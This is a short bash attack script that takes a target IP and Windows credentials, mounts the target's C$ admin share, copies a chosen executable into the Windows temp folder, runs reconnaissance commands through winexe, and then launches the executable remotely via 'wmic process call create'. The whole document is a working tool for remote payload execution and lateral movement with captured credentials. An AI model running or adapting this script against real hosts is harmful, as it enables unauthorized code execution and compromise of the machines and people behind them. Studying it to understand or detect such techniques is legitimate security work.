#################################################
# Created by @jgaudard  :: I don't twitter much 
# Used wmic to execute an exe payload.
# Created: 18 June 2016    Edited: 
# Version 0.1
#################################################
read -p "What is the target host's IP?: " ipaddy
read -p "What is the targets username?: " username
read -p "What is the targets password?: " password
read -p "What is the local path of the binary?: " lpath
read -p "What is the name of your binary?: " binary
read -p "Checking for /mnt/targetdrive, ctrl+c to excape."
[ -f /mnt/targetdrive ] && echo "/mnt/targetdrive already exists. Going to mount target drive to this path." || echo "Creating and mounting /mnt/targetdrive"; mkdir -p /mnt/targetdrive
mount.cifs //$ipaddy/C$ /mnt/targetdrive -o user=$username,password=$password
cp $lpath/$binary /mnt/targetdrive/windows/temp 
winexe -U "$username%$password" //$ipaddy ipconfig
winexe -U "$username%$password" //$ipaddy "wmic os list brief"
echo "winexe -U "$username%$password" //$ipaddy "wmic process call create c:\\windows\\temp\\$binary""
winexe -U "$username%$password" //$ipaddy "wmic process call create c:\\windows\\temp\\$binary"

